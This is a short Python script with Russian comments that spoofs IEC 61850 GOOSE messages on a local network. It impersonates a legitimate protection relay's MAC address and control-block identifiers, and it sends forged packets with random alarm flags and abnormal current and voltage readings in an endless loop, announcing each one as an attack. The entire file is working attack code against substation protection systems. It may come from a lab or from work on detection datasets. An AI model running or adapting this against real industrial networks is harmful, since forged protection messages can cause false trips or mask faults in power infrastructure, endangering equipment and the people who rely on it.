#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import random
from goose_gen import build_goose_packet
from scapy.all import sendp


src_mac = "02:0F:1E:3D:5C:7B"      # MAC легитимного РЗА
dst_mac = "FF:FF:FF:FF:FF:FF"
iface = "eth0"
goCBRef = "GOOSEControlBlock1"      # Подмена имени
datSet = "DataSet1"
goID = "GOOSE_ID_1"                      # Подмена
confRev = 1

st_num = 1
sq_num = 1

print("[ATTACK] Запуск атаки 'Подмена источника'...")
while True:
    # Отправляем пакет с чужим MAC и goCBRef, но с аномальными данными
    alarm_state = random.random() < 0.3 
    current = random.randint(50, 100)    # Аномальный ток
    voltage = random.randint(210, 250)
    power = int((current * voltage) / 1000)

    all_data = [alarm_state, current, voltage, power]
    pkt = build_goose_packet(
        src_mac, dst_mac, st_num, sq_num,
        goCBRef, datSet, goID, confRev, all_data
    )
    sendp(pkt, iface=iface, verbose=False)
    print(f"[ATTACK] Подмена: отправлен пакет от {goCBRef} (MAC {src_mac}) с током {current}A")

    if alarm_state:
        st_num += 1
        sq_num = 1
    else:
        sq_num += 1
    time.sleep(1)